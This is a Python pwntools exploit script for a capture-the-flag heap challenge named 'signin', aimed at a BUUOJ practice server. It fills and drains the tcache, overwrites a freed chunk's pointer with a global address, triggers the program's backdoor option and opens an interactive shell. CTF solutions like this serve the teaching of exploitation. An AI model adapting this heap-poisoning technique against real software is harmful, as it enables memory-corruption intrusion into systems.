#coding:utf-8

from pwn import *

context.log_level = 'debug'

debug = 0

def wpEdit(r, idx, string):	
	
	r.recvuntil('your choice?')
	r.send('2'.ljust(0xf, '\x00'))

	r.recvuntil('idx?\n')
	r.send(str(idx).ljust(0xf, '\x00'))
	r.send(string)

def wpBackdoor(r):
	r.recvuntil('your choice?')
	r.send('6'.ljust(0xf, '\x00'))

def wpDel(r, idx):
	r.recvuntil('your choice?')
	r.send('3'.ljust(0xf, '\x00'))

	r.recvuntil('idx?\n')
	r.send(str(idx).ljust(0xf, '\x00'))

def wpAdd(r, idx):
	r.recvuntil('your choice?')
	r.send('1'.ljust(0xf, '\x00'))

	r.recvuntil('idx?\n')
	r.send(str(idx).ljust(0xf, '\x00'))


def exp(debug):
	elf = ELF('./signin')
	if debug == 1:
		r = process('./signin')
		gdb.attach(r)
		#r = gdb.debug('./signin')
	else:
		r = remote('node3.buuoj.cn', 26705)

	
	ptr = 0x00000000004040c0


	
	wpAdd(r, 0)
	wpAdd(r, 1)
	wpAdd(r, 2)
	wpAdd(r, 3)
	wpAdd(r, 4)
	wpAdd(r, 5)
	wpAdd(r, 6)
	wpAdd(r, 7)
	#-------------tcache已满-------------
	wpDel(r, 0)
	wpDel(r, 1)
	wpDel(r, 2)
	wpDel(r, 3)
	wpDel(r, 4)
	wpDel(r, 5)
	wpDel(r, 6)


	wpDel(r, 7)

	#-----------------tcache空出来一个-----------------
	wpAdd(r, 8)

	wpEdit(r, 7, p64(ptr - 0x10))

	wpBackdoor(r)
	
	r.interactive()

exp(debug)
